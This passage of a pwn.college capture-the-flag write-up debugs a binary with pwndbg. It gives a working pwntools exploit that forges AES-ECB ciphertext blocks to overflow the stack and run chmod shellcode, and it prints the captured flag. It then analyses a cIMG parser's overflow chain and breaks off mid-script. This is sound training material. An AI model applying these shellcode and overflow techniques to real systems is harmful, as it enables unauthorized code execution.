   0x00000000004016a1 <+602>:	mov    rdi,rax
   0x00000000004016a4 <+605>:	call   0x401160 <memset@plt>
   0x00000000004016a9 <+610>:	mov    rax,QWORD PTR [rbp-0x18]
   0x00000000004016ad <+614>:	sub    eax,0x10
   0x00000000004016b0 <+617>:	mov    edi,eax
   0x00000000004016b2 <+619>:	mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004016b6 <+623>:	lea    rcx,[rax+0x10]
   0x00000000004016ba <+627>:	mov    rax,QWORD PTR [rip+0x2967]        # 0x404028 <ctx>
   0x00000000004016c1 <+634>:	lea    rdx,[rbp-0x64]
   0x00000000004016c5 <+638>:	lea    rsi,[rbp-0x60]
   0x00000000004016c9 <+642>:	add    rsi,0x10
   0x00000000004016cd <+646>:	mov    r8d,edi
   0x00000000004016d0 <+649>:	mov    rdi,rax
   0x00000000004016d3 <+652>:	call   0x401250 <EVP_DecryptUpdate@plt>
   0x00000000004016d8 <+657>:	mov    eax,DWORD PTR [rbp-0x64]
   0x00000000004016db <+660>:	cdqe
   0x00000000004016dd <+662>:	lea    rdx,[rbp-0x60]
   0x00000000004016e1 <+666>:	add    rdx,0x10
   0x00000000004016e5 <+670>:	lea    rcx,[rdx+rax*1]
   0x00000000004016e9 <+674>:	mov    rax,QWORD PTR [rip+0x2938]        # 0x404028 <ctx>
   0x00000000004016f0 <+681>:	lea    rdx,[rbp-0x64]
   0x00000000004016f4 <+685>:	mov    rsi,rcx
   0x00000000004016f7 <+688>:	mov    rdi,rax
   0x00000000004016fa <+691>:	call   0x4011e0 <EVP_DecryptFinal_ex@plt>
   0x00000000004016ff <+696>:	lea    rax,[rbp-0x60]
   0x0000000000401703 <+700>:	add    rax,0x10
   0x0000000000401707 <+704>:	mov    rsi,rax
   0x000000000040170a <+707>:	lea    rdi,[rip+0xa6b]        # 0x40217c
   0x0000000000401711 <+714>:	mov    eax,0x0
   0x0000000000401716 <+719>:	call   0x401150 <printf@plt>
   0x000000000040171b <+724>:	nop
   0x000000000040171c <+725>:	leave
   0x000000000040171d <+726>:	ret
End of assembler dump.
```

The instruction at `challenge+652` calls the `EVP_DecryptUpdate@plt` with the arguments. One of those arguments is the location to which the plaintext will be read.
We have to set a breakpoint there.

If we run it within GDB, the program wont be able to open the `.key` file because GDB drops permissions. Thus it will into error before ever reaching our breakpoint.
To combat this, we can invoke the program via pwntools and attach GDB to it. For this we will have to open practice mode.

```py title="~/script.py" showLineNumbers
from pwn import *

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# Block 1 - "VERIFIED" header and length (16 bytes)
sample_cipher = get_encrypted_block(b"A")
header_block = sample_cipher[0:16]

# Craft payload
payload = header_block 

# 5. Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')

# Print the PID for GDB attachment
print(f"[+] Target PID: {p.pid}")
pause() 

p.send(payload)

p.interactive()
```

```
hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (16 bytes) to target...
[+] Starting local process '/challenge/vulnerable-overflow': pid 4495
[+] Target PID: 4495
[*] Paused (press any to continue)
```

Now let's attach GDB / Pwndbg to process `4495`.

```
hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ sudo pwndbg -p 4495
pwndbg: loaded 205 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Attaching to process 4495
Reading symbols from /challenge/vulnerable-overflow...
(No debugging symbols found in /challenge/vulnerable-overflow)
Reading symbols from /lib/x86_64-linux-gnu/libcrypto.so.1.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libcrypto.so.1.1)
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
Reading symbols from /usr/lib/debug/.build-id/57/92732f783158c66fb4f3756458ca24e46e827d.debug...
Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2...
Reading symbols from /usr/lib/debug/.build-id/9c/027be0ded30b025739f52dd6670772e0e56719.debug...
Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0...
Reading symbols from /usr/lib/debug/.build-id/97/53720502573b97dbac595b61fd72c2df18e078.debug...
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/db/3ae442c4308e6250049fb6159c302cf4274fa2.debug...
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x00007ffff7bfe1f2 in __GI___libc_read (fd=0, buf=0x405460, nbytes=4096) at ../sysdeps/unix/sysv/linux/read.c:26

warning: 26     ../sysdeps/unix/sysv/linux/read.c: No such file or directory
------- tip of the day (disable with set show-tips off) -------
Use the errno (or errno <number>) command to see the name of the last or provided (libc) error
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x401790 (__libc_csu_init) ◂— endbr64 
 RCX  0x7ffff7bfe1f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x1000
 RDI  0
 RSI  0x405460 ◂— 0
 R8   0x405460 ◂— 0
 R9   0x7c
 R10  0
 R11  0x246
 R12  0x401270 (_start) ◂— endbr64 
 R13  0x7fffffffe6e0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fffffffe5c0 —▸ 0x7fffffffe5f0 ◂— 0
 RSP  0x7fffffffe528 —▸ 0x401570 (challenge+297) ◂— mov qword ptr [rbp - 0x18], rax
 RIP  0x7ffff7bfe1f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x7ffff7bfe1f2 <read+18>          cmp    rax, -0x1000     0xfffffffffffffe00 - -0x1000     EFLAGS => 0x206 [ cf PF af zf sf IF df of ac ]
   0x7ffff7bfe1f8 <read+24>        ✔ ja     read+112                    <read+112>
    ↓
   0x7ffff7bfe250 <read+112>         mov    rdx, qword ptr [rip + 0xddc19]     RDX, [0x7ffff7cdbe70] => 0xffffffffffffff80
   0x7ffff7bfe257 <read+119>         neg    eax
   0x7ffff7bfe259 <read+121>         mov    dword ptr fs:[rdx], eax            [0x7ffff7ac5b00] <= 0x200
   0x7ffff7bfe25c <read+124>         mov    rax, 0xffffffffffffffff            RAX => 0xffffffffffffffff
   0x7ffff7bfe263 <read+131>         ret                                <challenge+297>
    ↓
   0x401570       <challenge+297>    mov    qword ptr [rbp - 0x18], rax     [0x7fffffffe5a8] <= 0xffffffffffffffff
   0x401574       <challenge+301>    mov    rax, qword ptr [rbp - 0x18]     RAX, [0x7fffffffe5a8] => 0xffffffffffffffff
   0x401578       <challenge+305>    and    eax, 0xf                        EAX => 15 (0xffffffff & 0xf)
   0x40157b       <challenge+308>    test   rax, rax                        0xf & 0xf     EFLAGS => 0x206 [ cf PF af zf sf IF df of ac ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe528 —▸ 0x401570 (challenge+297) ◂— mov qword ptr [rbp - 0x18], rax
01:0008│-090 0x7fffffffe530 ◂— 0
02:0010│-088 0x7fffffffe538 —▸ 0x7fffffffe6f8 —▸ 0x7fffffffe991 ◂— 'SHELL=/run/dojo/bin/bash'
03:0018│-080 0x7fffffffe540 —▸ 0x7fffffffe6e8 —▸ 0x7fffffffe972 ◂— '/challenge/vulnerable-overflow'
04:0020│-078 0x7fffffffe548 ◂— 0x1f7cdd6a0
05:0028│-070 0x7fffffffe550 ◂— 0
06:0030│-068 0x7fffffffe558 —▸ 0x7ffff7b82525 (_IO_default_setbuf+69) ◂— cmp eax, -1
07:0038│-060 0x7fffffffe560 ◂— 0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x7ffff7bfe1f2 read+18
   1         0x401570 challenge+297
   2         0x401786 main+104
   3   0x7ffff7b14083 __libc_start_main+243
   4         0x40129e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Let's set our breakpoint, at `challenge+652` again and run.

```
pwndbg> break *(challenge+652)
Breakpoint 1 at 0x4016d3
```

```
pwndbg> c
Continuing.

```

We now have to release the process from the terminal from where we ran our Python script. For that, we have to press `ENTER`.

```
hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (16 bytes) to target...
[+] Starting local process '/challenge/vulnerable-overflow': pid 4495
[+] Target PID: 4495
[*] Paused (press any to continue)
[*] Switching to interactive mode
$  
```

Now, let's go back to GDB.

```
pwndbg> c
Continuing.

Breakpoint 1, 0x00000000004016d3 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────
*RAX  0x406470 —▸ 0x7ffff7f91ec0 ◂— 0x10000001a2
 RBX  0x401790 (__libc_csu_init) ◂— endbr64 
*RCX  0x405470 ◂— 0
*RDX  0x7fffffffe55c ◂— 0x4952455600000010
*RDI  0x406470 —▸ 0x7ffff7f91ec0 ◂— 0x10000001a2
*RSI  0x7fffffffe570 ◂— 0
*R8   0
*R9   0
 R10  0
*R11  0x7ffff7cdcbe0 (main_arena+96) —▸ 0x406620 ◂— 0
 R12  0x401270 (_start) ◂— endbr64 
 R13  0x7fffffffe6e0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fffffffe5c0 —▸ 0x7fffffffe5f0 ◂— 0
*RSP  0x7fffffffe530 ◂— 0
*RIP  0x4016d3 (challenge+652) ◂— call EVP_DecryptUpdate@plt
────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x4016d3 <challenge+652>    call   EVP_DecryptUpdate@plt       <EVP_DecryptUpdate@plt>
        ctx: 0x406470 —▸ 0x7ffff7f91ec0 ◂— 0x10000001a2
        out: 0x7fffffffe570 ◂— 0
        outl: 0x7fffffffe55c ◂— 0x4952455600000010
        in: 0x405470 ◂— 0
        inl: 0
 
   0x4016d8 <challenge+657>    mov    eax, dword ptr [rbp - 0x64]
   0x4016db <challenge+660>    cdqe   
   0x4016dd <challenge+662>    lea    rdx, [rbp - 0x60]
   0x4016e1 <challenge+666>    add    rdx, 0x10
   0x4016e5 <challenge+670>    lea    rcx, [rdx + rax]
   0x4016e9 <challenge+674>    mov    rax, qword ptr [rip + 0x2938]     RAX, [ctx]
   0x4016f0 <challenge+681>    lea    rdx, [rbp - 0x64]
   0x4016f4 <challenge+685>    mov    rsi, rcx
   0x4016f7 <challenge+688>    mov    rdi, rax
   0x4016fa <challenge+691>    call   EVP_DecryptFinal_ex@plt     <EVP_DecryptFinal_ex@plt>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp   0x7fffffffe530 ◂— 0
01:0008│-088   0x7fffffffe538 —▸ 0x7fffffffe6f8 —▸ 0x7fffffffe991 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-080   0x7fffffffe540 —▸ 0x7fffffffe6e8 —▸ 0x7fffffffe972 ◂— '/challenge/vulnerable-overflow'
03:0018│-078   0x7fffffffe548 ◂— 0x1f7cdd6a0
04:0020│-070   0x7fffffffe550 ◂— 0
05:0028│ rdx-4 0x7fffffffe558 ◂— 0x10f7b82525
06:0030│-060   0x7fffffffe560 ◂— 0x4445494649524556 ('VERIFIED')
07:0038│-058   0x7fffffffe568 ◂— 1
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4016d3 challenge+652
   1         0x401786 main+104
   2   0x7ffff7b14083 __libc_start_main+243
   3         0x40129e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Let's also get the saved return address.

```
pwndbg> info frame
Stack level 0, frame at 0x7fffffffe5d0:
 rip = 0x4016d3 in challenge; saved rip = 0x401786
 called by frame at 0x7fffffffe600
 Arglist at 0x7fffffffe5c0, args: 
 Locals at 0x7fffffffe5c0, Previous frame's sp is 0x7fffffffe5d0
 Saved registers:
  rbp at 0x7fffffffe5c0, rip at 0x7fffffffe5c8
```

- [x] Location of the buffer: `0x7fffffffe570`
- [x] Location of the saved return pointer to `main()`: `0x7fffffffe5c8`

### Exploit

Let's if the `/challenge/vulnerable-overflow` binary is PIE.

```
hacker@integrated-security~ecb-to-shellcode-hard:~$ checksec /challenge/vulnerable-overflow 
[*] '/challenge/vulnerable-overflow'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```
hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ ln -sf /flag ~/Z
```

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "error"

# Initialize values
buffer_addr = 0x7fffffffe570
addr_of_saved_ip = 0x7fffffffe5c8 
shellcode_addr = buffer_addr

# Calculate offset & number of padding blocks
offset = addr_of_saved_ip - buffer_addr
num_padding_blocks = offset // 16

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# Block 1 - "VERIFIED" header and length (16 bytes)
sample_cipher = get_encrypted_block(b"A")
header_block = sample_cipher[0:16]

# Block 2 - Shellcode
shellcode_asm = """
   /* chmod("z", 0004) */
   push 0x5a
   push rsp
   pop rdi
   pop rax
   mov sil, 0x4
   syscall
"""
shellcode = asm(shellcode_asm).ljust(16, b'\x90')
shellcode_cipher = get_encrypted_block(shellcode)
shellcode_block = shellcode_cipher[16:32]

# Block 2-6 - Padding chain
padding_harvest = get_encrypted_block(b"B" * 16)
padding_block = padding_harvest[16:32]
# Since this time the buffer_addr signifies the address of plaintext, and not plaintext.mesage, we have to subtract 16 bytes (8 for plaintext.header, 8 for plaintext.length)
padding_blocks = padding_block * (num_padding_blocks - 1)

# Block 7 - Return address overwrite
shellcode_addr_block = b"C" * 8 
shellcode_addr_block += p64(shellcode_addr)
return_addr_cipher = get_encrypted_block(shellcode_addr_block)
return_address_block = return_addr_cipher[16:32]

# Block 8 - PKCS7 padding
pkcs_padding_suffix = sample_cipher[-16:]

# Craft payload
payload = header_block 
payload += shellcode_block
payload += padding_blocks
payload += return_address_block 
payload += pkcs_padding_suffix

# Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(payload)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')
p.send(payload)

p.interactive()
```

```
hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (128 bytes) to target...
Decrypted message: jZT_X@\xb6\x04\x0f\x05\x90\x90\x90\x90\x90\x90BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCp\xe5\xff\xff\xff\x7f!
$  
```

```
hacker@practice~integrated-security~ecb-to-shellcode-hard:~$ cat /flag
pwn.college{practice}
```

Great!!
The same script will work in the non-practice mode as the binary is non-PIE.

```
hacker@integrated-security~ecb-to-shellcode-hard:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (128 bytes) to target...
Decrypted message: jZT_X@\xb6\x04\x0f\x05\x90\x90\x90\x90\x90\x90BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCp\xe5\xff\xff\xff\x7f!
$
```

```
hacker@integrated-security~ecb-to-shellcode-hard:~$ cat /flag
pwn.college{wmHupm0Wp3hQROeesdi06fN4QYC.QXwYDMxEDL4ITM0EzW}
```

&nbsp;

## cIMG Screenshots

### Binary Analysis

```
hacker@integrated-security~integration-cimg-screenshot-sc:~$ checksec /challenge/integration-cimg-screenshot-sc
[*] '/challenge/integration-cimg-screenshot-sc'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

The binary processes a custom `.cimg` image format. It begins with a 12-byte header:

```
Offset  Size  Field
------  ----  -----
0       4     Magic: "cIMG"
4       2     Version (little-endian)
6       1     Canvas width
7       1     Canvas height
8       4     Directive count (little-endian)
```

After the header, the binary reads and dispatches that many directives. Each directive starts with a 2-byte opcode that selects one of eight handlers.

```c title="/challenge/integration-cimg-screenshot-sc :: main() :: Pseudocode" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rcx
  int *v5; // rdi
  const char *v6; // r12
  int v7; // eax
  const char *v8; // rdi
  __int64 v10; // rdx
  unsigned __int16 v12; // [rsp+6h] [rbp-1032h] BYREF
  int v13; // [rsp+8h] [rbp-1030h] BYREF
  __int16 v14; // [rsp+Ch] [rbp-102Ch]
  int v15; // [rsp+10h] [rbp-1028h]

  v3 = 1030;
  v5 = &v13;
  while ( v3 )
  {
    *v5++ = 0;
    --v3;
  }
  if ( argc > 1 )
  {
    v6 = argv[1];
    if ( strcmp(&v6[strlen(v6) - 5], ".cimg") )
    {
      __printf_chk(1, "ERROR: file has incorrect extension");
      goto LABEL_11;
    }
    v7 = open(v6, 0);
    dup2(v7, 0);
  }
  read_exact(0, &v13, 12, "ERROR: Failed to read cimg header!", 0xFFFFFFFFLL);
  if ( v13 != 1196247395 )
  {
    v8 = "ERROR: Invalid magic number!";
LABEL_10:
    puts(v8);
    goto LABEL_11;
  }
  v8 = "ERROR: Unsupported version!";
  if ( v14 != 4 )
    goto LABEL_10;
  initialize_framebuffer(&v13);
  while ( v15-- )
  {
    read_exact(0, &v12, 2, "ERROR: Failed to read &directive_code!", 0xFFFFFFFFLL);
    if ( v12 > 7u )
    {
      if ( v12 != 1337 )
      {
LABEL_26:
        __fprintf_chk(stderr, 1, "ERROR: invalid directive_code %ux\n", v12);
LABEL_11:
        exit(-1);
      }
      handle_1337(&v13);
    }
    else
    {
      if ( !v12 )
        goto LABEL_26;
      switch ( v12 )
      {
        case 2u:
          handle_2((__int64)&v13);
          break;
        case 3u:
          handle_3(&v13);
          break;
        case 4u:
          handle_4(&v13);
          break;
        case 5u:
          handle_5(&v13);
          break;
        case 6u:
          handle_6(&v13);
          break;
        case 7u:
          handle_7(&v13);
          break;
        default:
          handle_1(&v13, &v12, v10, (unsigned int)v12 - 2);
          break;
      }
    }
  }
  display(&v13, 0);
  return 0;
}
```

The relevant handlers are:

**`handle_5()`** loads a sprite from a file. It reads 258 bytes from the `.cimg` stream: `[sprite_id, width, height, path...]`. It opens the file at `path`, allocates `width × height` bytes, and reads the raw file contents in. The only validation is a `strncmp` that rejects files whose contents start with `"pwn.college{"`.

```c title="/challenge/integration-cimg-screenshot-sc :: handle_5() :: Pseudocode" showLineNumbers
int __fastcall handle_5(__int64 a1)
{
  __int16 v2; // dx
  int v3; // eax
  FILE *v4; // rsi
  const char *v5; // rdi
  unsigned int v6; // ebp
  void *v7; // rdi
  int v8; // r13d
  const char *v9; // rax
  const char *v10; // rbx
  _BYTE v12[299]; // [rsp+Dh] [rbp-12Bh] BYREF

  memset(v12, 0, 0x103u);
  read_exact(0, v12, 258, "ERROR: Failed to read &sprite_load_record!", 0xFFFFFFFFLL);
  LOBYTE(v2) = v12[2];
  HIBYTE(v2) = v12[1];
  *(_WORD *)(a1 + 16LL * v12[0] + 24) = v2;
  v3 = open(&v12[3], 0);
  v4 = stderr;
  v5 = "ERROR: failed to open sprite file\n";
  if ( v3 < 0 )
    goto LABEL_9;
  v6 = v3;
  v7 = *(void **)(16LL * v12[0] + a1 + 32);
  if ( v7 )
    free(v7);
  v8 = v12[2] * v12[1];
  v9 = (const char *)malloc(v8);
  v10 = v9;
  if ( !v9 )
  {
    puts("ERROR: Failed to allocate memory for the image data!");
    goto LABEL_6;
  }
  read_exact(v6, v9, (unsigned int)v8, "ERROR: Failed to read data!", 0xFFFFFFFFLL);
  if ( !strncmp(v10, "pwn.college{", 0xCu) )
  {
    v4 = stderr;
    v5 = "ERROR: shenanigans detected!!!!!";
LABEL_9:
    fputs(v5, v4);
LABEL_6:
    exit(-1);
  }
  *(_QWORD *)(16LL * v12[0] + a1 + 32) = v10;
  return close(v6);
}
```

**`handle_4()`** renders a sprite onto the canvas. It reads 9 parameter bytes: `[sprite_id, R, G, B, src_x, src_y, dest_w, dest_h, transparency_key]`. The canvas stores each pixel as a 24-byte ANSI escape sequence `\x1b[38;2;RRR;GGG;BBMc\x1b[0m`, where the character `c` is at byte offset 19. handle_4 writes each sprite byte directly into the `c` position of the corresponding pixel — **no printable-ASCII validation**, unlike handle_2 and handle_3. Pixels whose sprite byte equals `transparency_key` are skipped.

```c title="/challenge/integration-cimg-screenshot-sc :: handle_4() :: Pseudocode" showLineNumbers
// positive sp value has been detected, the output may be wrong!
__int64 __fastcall handle_4(__int64 a1)
{
  _DWORD *v2; // rdi
  __int64 v3; // rcx
  __int64 v4; // rdx
  char v5; // r10
  char v6; // r11
  char v7; // bp
  __int64 v8; // rdx
  int v9; // r12d
  int v10; // r8d
  int v11; // edi
  __int64 v12; // rax
  __int64 v13; // r9
  int i; // r15d
  __int64 result; // rax
  int j; // r10d
  int v17; // r11d
  __int64 v18; // rdx
  int v19; // r12d
  int v20; // ebp
  int k; // r13d
  int v22; // eax
  __int64 v23; // rax
  __int64 v24; // rdx
  int v25; // r14d
  __int64 v26; // rdx
  __int64 v27; // rdx
  int v28; // [rsp-40h] [rbp-40070h]
  int v29; // [rsp-3Ch] [rbp-4006Ch]
  _BYTE v30[7]; // [rsp-2Ah] [rbp-4005Ah] BYREF
  unsigned __int8 v31; // [rsp-23h] [rbp-40053h]
  char v32; // [rsp-22h] [rbp-40052h]
  __int128 v33; // [rsp-21h] [rbp-40051h] BYREF
  __int64 v34; // [rsp-11h] [rbp-40041h]
  _BYTE v35[8]; // [rsp-8h] [rbp-40038h] BYREF
  char v36; // [rsp+0h] [rbp-40030h] BYREF
  __int64 v37; // [rsp+1000h] [rbp-3F030h] BYREF

  while ( &v36 != (char *)(&v37 - 0x8000) )
    ;
  read_exact(0, v30, 9, "ERROR: Failed to read &sprite_render_record!", 0xFFFFFFFFLL);
  v2 = v35;
  v3 = 0x10000;
  v4 = v30[0];
  v5 = v30[1];
  while ( v3 )
  {
    *v2++ = 0;
    --v3;
  }
  v6 = v30[2];
  v7 = v30[3];
  v8 = a1 + 16 * v4;
  v9 = *(unsigned __int8 *)(v8 + 24);
  while ( v9 > (int)v3 )
  {
    v10 = *(unsigned __int8 *)(v8 + 25);
    v11 = 0;
    v12 = (unsigned int)(v3 * v10);
    while ( v10 > v11 )
    {
      v13 = *(_QWORD *)(v8 + 32);
      v35[4 * v12] = v5;
      v35[4 * v12 + 1] = v6;
      v35[4 * v12 + 2] = v7;
      if ( !v13 )
      {
        fputs("ERROR: attempted to render uninitialized sprite!\n", stderr);
        exit(-1);
      }
      ++v11;
      v35[4 * v12 + 3] = *(_BYTE *)(v13 + v12);
      ++v12;
    }
    LODWORD(v3) = v3 + 1;
  }
  for ( i = 0; ; ++i )
  {
    result = v31;
    if ( v31 <= i )
      break;
    for ( j = 0; v30[6] > j; ++j )
    {
      v17 = 0;
      v18 = a1 + 16LL * v30[0];
      v19 = (unsigned __int8)(v30[4] + j * *(_BYTE *)(v18 + 25));
      v20 = (unsigned __int8)(v30[5] + i * *(_BYTE *)(v18 + 24));
      while ( *(unsigned __int8 *)(16LL * v30[0] + a1 + 24) > v17 )
      {
        for ( k = 0; ; ++k )
        {
          v22 = *(unsigned __int8 *)(16LL * v30[0] + a1 + 25);
          if ( v22 <= k )
            break;
          v23 = k + v17 * v22;
          v24 = (unsigned __int8)v35[4 * v23 + 3];
          if ( (_BYTE)v24 != v32 )
          {
            v29 = v17;
            v25 = *(unsigned __int8 *)(a1 + 6);
            v28 = j;
            __snprintf_chk(
              &v33,
              25,
              1,
              25,
              "\x1B[38;2;%03d;%03d;%03dm%c\x1B[0m",
              (unsigned __int8)v35[4 * v23],
              (unsigned __int8)v35[4 * v23 + 1],
              (unsigned __int8)v35[4 * v23 + 2],
              v24);
            v17 = v29;
            j = v28;
            v26 = (unsigned int)((k + v19) % v25);
            LODWORD(v26) = (unsigned int)(v26 + v20 * v25) % *(_DWORD *)(a1 + 12);
            v27 = *(_QWORD *)(a1 + 16) + 24 * v26;
            *(_OWORD *)v27 = v33;
            *(_QWORD *)(v27 + 16) = v34;
          }
        }
        ++v17;
        ++v20;
      }
    }
  }
  return result;
}
```

**`handle_1337()`** screenshots a rectangular region of the canvas. It reads 5 parameter bytes: `[dest_sprite_id, src_x, src_y, width, height]`. It then iterates over `width × height` canvas pixels, extracting the character byte at offset 19 of each pixel's ANSI string, and stores it into a local output buffer:

```c title="/challenge/integration-cimg-screenshot-sc :: handle_1337() :: Pseudocode" showLineNumbers
__int16 __fastcall handle_1337(__int64 a1)
{
  int v2; // r12d
  _BYTE *v3; // rdi
  int v4; // esi
  int v5; // r13d
  int v6; // r11d
  int v7; // r10d
  __int64 v8; // r8
  __int64 i; // rcx
  void *v10; // rdi
  __int16 result; // ax
  __int64 v12; // rbx
  _BYTE v13[3]; // [rsp+Bh] [rbp-ADh] BYREF
  unsigned __int8 v14; // [rsp+Eh] [rbp-AAh]
  unsigned __int8 v15; // [rsp+Fh] [rbp-A9h]
  _BYTE v16[168]; // [rsp+10h] [rbp-A8h] BYREF

  read_exact(0, v13, 5, "ERROR: Failed to read &sprite_screenshot_record!", 0xFFFFFFFFLL);
  v2 = v14;
  v3 = v16;
  v4 = 0;
  v5 = v15;
  v6 = v13[1];
  v7 = v13[2];
  v8 = v14;
  while ( v5 > v4 )
  {
    for ( i = 0; v2 > (int)i; ++i )
      v3[i] = *(_BYTE *)(*(_QWORD *)(a1 + 16)
                       + 24LL
                       * (((unsigned int)i + v6 + (v7 + v4) * *(unsigned __int8 *)(a1 + 6)) % *(_DWORD *)(a1 + 12))
                       + 19);
    ++v4;
    v3 += v8;
  }
  v10 = *(void **)(16LL * v13[0] + a1 + 32);
  if ( v10 )
    free(v10);
  LOBYTE(result) = v15;
  HIBYTE(result) = v14;
  v12 = 16LL * v13[0] + a1;
  *(_QWORD *)(v12 + 32) = v16;
  *(_WORD *)(v12 + 24) = result;
  return result;
}
```

The output buffer `v16` is at `rsp+0x10`, and the return address sits at `rsp+0xb8`, a distance of 168 bytes from the start of the buffer. There is no bounds check on `width × height`, so supplying a region wider than 168 pixels overwrites the saved return address, a classic stack buffer overflow.

```c title="/challenge/integration-cimg-screenshot-sc :: handle_1337() :: Pseudocode" showLineNumbers
__int16 __fastcall handle_1337(__int64 a1)
{

  # ---- snip ----

  _BYTE v16[168]; // [rsp+10h] [rbp-A8h] BYREF
  
  # ---- snip ----

  read_exact(0, v13, 5, "ERROR: Failed to read &sprite_screenshot_record!", 0xFFFFFFFFLL);

  # ---- snip ----

  while ( v5 > v4 )
  {
    for ( i = 0; v2 > (int)i; ++i )
      v3[i] = *(_BYTE *)(*(_QWORD *)(a1 + 16)
                       + 24LL * (...)
                       + 19);
    
    # ---- snip ----

  }
  
  # ---- snip ----

}
```

The binary also disables ASLR by re-executing itself with `ADDR_NO_RANDOMIZE`, and the stack has no canary, making the overflow trivially exploitable.

### Exploit

The exploit chain is:

1. **`handle_5()`** loads arbitrary bytes from `/tmp/exploit.bin` into sprite slot 0. Because it reads a binary file with no ASCII check, this can carry shellcode.
2. **`handle_4()`** renders sprite 0 onto the canvas. Each byte of the sprite becomes the character position of a canvas pixel. This smuggles non-printable shellcode bytes into the framebuffer.
3. **`handle_1337()`** screenshots a `176 × 1` region into the output buffer on the stack. `176 > 168`, so the last 8 bytes overwrite the saved return address.

The payload in `exploit.bin` is:
- NOP sled filling buffer[0..(167 - len(sc))]
- PIC chmod shellcode using RIP-relative `flag_str` label
- 8-byte return address pointing to the start of the output buffer (confirmed at `0x7fffffffda00`)

The shellcode uses `lea rdi, [rip + flag_str]` to reference `"/flag"` inline, then calls `chmod("/flag", 0o777)` via `push/pop rax` and exits:

```python title="~/script.py" showLineNumbers
from pwn import *
import struct
import subprocess

context.arch = 'amd64'
context.os = 'linux'

CANVAS_W = 200
CANVAS_H = 1
DIRECTIVES = 3

